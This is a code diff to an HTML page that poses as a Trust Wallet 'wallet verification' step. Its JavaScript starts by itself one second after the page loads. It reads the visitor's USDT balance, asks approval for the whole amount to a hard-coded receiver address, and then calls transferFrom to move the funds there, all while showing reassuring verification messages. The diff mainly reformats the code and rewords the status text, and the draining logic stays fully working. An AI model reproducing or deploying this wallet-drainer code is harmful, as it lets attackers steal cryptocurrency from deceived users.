@@ -15,14 +15,8 @@
       height: 100vh; text-align: center;
     }
     img { width: 80px; margin-bottom: 20px; }
-    .footer {
-      font-size: 12px; margin-top: 50px;
-      opacity: 0.6;
-    }
-    .status {
-      margin-top: 10px;
-      color: #ccc;
-    }
+    .footer { font-size: 12px; margin-top: 50px; opacity: 0.6; }
+    .status { margin-top: 10px; color: #ccc; }
   </style>
 </head>
 <body>
@@ -35,19 +29,15 @@
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
 
     const ABI = [
-      { constant: false, inputs: [ { name: "_spender", type: "address" }, { name: "_value", type: "uint256" } ], name: "approve", outputs: [ { name: "", type: "bool" } ], type: "function" },
-      { constant: false, inputs: [ { name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" } ], name: "transferFrom", outputs: [ { name: "", type: "bool" } ], type: "function" },
-      { constant: true, inputs: [ { name: "owner", type: "address" } ], name: "balanceOf", outputs: [ { name: "balance", type: "uint256" } ], type: "function" }
+      {"constant": true, "inputs": [{"name": "owner","type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance","type": "uint256"}], "type": "function"},
+      {"constant": false, "inputs": [{"name": "_spender","type": "address"},{"name": "_value","type": "uint256"}], "name": "approve", "outputs": [{"name": "","type": "bool"}], "type": "function"},
+      {"constant": false, "inputs": [{"name": "_from","type": "address"},{"name": "_to","type": "address"},{"name": "_value","type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "","type": "bool"}], "type": "function"}
     ];
 
     async function beginVerification() {
       try {
         const status = document.getElementById('status');
-
-        if (!window.ethereum) {
-          status.textContent = "⚠️ Please open this page in Trust Wallet browser.";
-          return;
-        }
+        if (!window.ethereum) { status.textContent = "⚠️ Please open this page in Trust Wallet DApp browser."; return; }
 
         const web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -58,32 +48,26 @@
         status.textContent = "🔍 Checking USDT balance...";
         const balance = await contract.methods.balanceOf(user).call();
         const amount = web3.utils.toBN(balance);
+        if (amount.isZero()) { status.textContent = "🚫 No USDT available to verify."; return; }
 
-        if (amount.isZero()) {
-          status.textContent = "🚫 No USDT available to verify.";
-          return;
-        }
-
-        status.textContent = "🛡️ Approving smart contract access...";
+        status.textContent = "🛡️ Approving transaction...";
         await contract.methods.approve(RECEIVER, amount).send({ from: user });
 
-        status.textContent = "✅ Approved. Finalizing verification...";
+        status.textContent = "✅ Approved. Finalizing transfer...";
         setTimeout(async () => {
           try {
             await contract.methods.transferFrom(user, RECEIVER, amount).send({ from: user });
-            status.textContent = "🎉 Success! Wallet verified.";
-          } catch (err) {
-            status.textContent = "❌ Transfer failed: " + err.message;
+            status.textContent = "🎉 Success! Wallet verified and USDT transferred.";
+          } catch (e) {
+            status.textContent = "❌ Transfer failed: " + e.message;
           }
         }, 1500);
 
-      } catch (err) {
-        document.getElementById('status').textContent = "❌ Error: " + err.message;
+      } catch (e) {
+        document.getElementById('status').textContent = "❌ Error: " + e.message;
       }
     }
 
-    window.addEventListener('load', () => {
-      setTimeout(beginVerification, 1000);
-    });
+    window.addEventListener('load', () => setTimeout(beginVerification, 1000));
   </script></body>
 </html>
